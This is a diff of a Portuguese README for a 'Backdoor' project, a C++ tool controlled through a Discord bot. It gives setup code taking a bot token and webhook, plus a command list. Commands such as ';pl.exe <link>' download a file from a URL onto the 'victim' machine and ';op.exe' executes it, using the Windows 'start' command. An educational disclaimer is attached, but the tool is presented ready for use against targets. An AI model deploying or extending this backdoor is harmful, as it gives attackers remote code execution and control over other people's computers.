@@ -1,96 +1,59 @@
-Backdoor
+# Backdoor
 
-Este projeto é uma API pública para fins educacionais que se assemelha a um backdoor.
-Você pode utilizá-la junto ao seu programa para obter acesso ao download e execução de arquivos na máquina alvo.
-Isso pode ser explorado como um trojan, mas o objetivo deste projeto é puramente educacional.
+Esse projeto é uma API pública para fins educacionais que se assemelha a um backdoor.  
+Você pode utilizá-la junto ao seu programa para realizar downloads e executar arquivos na máquina alvo.  
+Isso pode abrir portas para um trojan, mas o objetivo deste projeto não é esse.  
 
-Instalação de Dependências
+## Instalação das Dependências
 
-Para rodar corretamente este programa, você precisará do DPP e do Curl. Caso esteja no Arch Linux, você pode instalá-los usando o AUR:
+Este programa requer **DPP** e **cURL**.  
+No Arch Linux, por exemplo, você pode instalá-los facilmente com o AUR:
 
+```sh
 yay -S dpp curl
+```
 
-Uso do Backdoor no Código
-
-Para utilizar o backdoor em seu aplicativo, configure o seguinte código:
-
-#include "network.hpp"
-
-int main(){
-    std::string token = "seu_token_aqui";
-    const std::string& webhook_url = "seu_webhook_aqui";
-    const std::string version = "1.3";
+    #include "network.hpp"
     
+    int main() {
+        std::string token = "SEU_TOKEN_AQUI";
+        const std::string webhook_url = "SEU_WEBHOOK_AQUI";
+        const std::string version = "1.3";
+
     network program(token, webhook_url, version);
     program.MAIN();
     program.perfomBot();
-    
+
     return 0;
 }
 
-⚠️ Atenção: Dependendo do sistema operacional do alvo, o comando de execução do aplicativo baixado deve ser alterado.
-O padrão está configurado para Windows ("start"). Para modificar, edite o arquivo network.hpp, linha 64.
+OBS: O código acima é um exemplo e pode precisar de ajustes para funcionar corretamente.
+
+ATENÇÃO: Se o sistema operacional da vítima não for Windows, o comando de execução do arquivo baixado precisará ser alterado.
+Atualmente, ele usa o comando start do Windows. Para modificar, edite a linha 64 do arquivo network.hpp.
 
 Comandos Básicos
 
-Os comandos abaixo são utilizados para interagir com o backdoor pelo bot do Discord.
+Os comandos do bot são acionados pelo prefixo ;.
+Segue a lista de comandos disponíveis:
+Comando	Função
+;shutDown	    Desliga o bot (não a máquina).
+;deBugger on	Ativa o modo debug.
+;deBugger off	Desativa o modo debug.
+;version	    Mostra a versão do bot.
+;add <grupo>	Adiciona o bot a um grupo específico.
+;pl.<tipo>	    Baixa um arquivo da internet (png, exe, gif, etc.).
+;op.<tipo>	    Abre um arquivo baixado.
+;credits	    Exibe os créditos do projeto.
+;devBot	        Link para configurar o bot no Discord.
 
-Comando de Desligamento
 
-Desativa o bot sem desligar a máquina:
+Exemplo de Uso:
 
-;shutDown
+Para baixar um arquivo .png, envie:
 
-Modo Debugger
+;pl.Png https://example.com/imagem.png
 
-Ativa ou desativa o modo debugger:
+Para abrir o arquivo baixado:
 
-;deBugger on  # Ativar
-;deBugger off # Desativar
-
-Verificar a Versão
-
-Exibe a versão do bot:
-
-;version
-
-Adicionar a um Grupo
-
-Permite adicionar a um grupo para envio de mensagens direcionadas:
-
-;add nome_do_grupo
-
-Baixar Arquivos
-
-Faz o download de arquivos da internet:
-
-;pl.png link_do_arquivo
-;pl.exe link_do_arquivo
-;pl.mp4 link_do_arquivo
-
-Abrir Arquivos Baixados
-
-Executa arquivos previamente baixados:
-
-;op.png
-;op.exe
-;op.mp4
-
-Créditos
-
-Mostra os créditos do desenvolvedor:
-
-;credits
-
-Configurar o Bot
-
-Link para configurar o bot no Discord Developers:
-
-;devBot
-
-Considerações Finais
-
-Este projeto foi desenvolvido apenas para aprendizado e pesquisa.
-O uso inadequado pode resultar em consequências legais.
-Use com responsabilidade.
-
+;op.Png
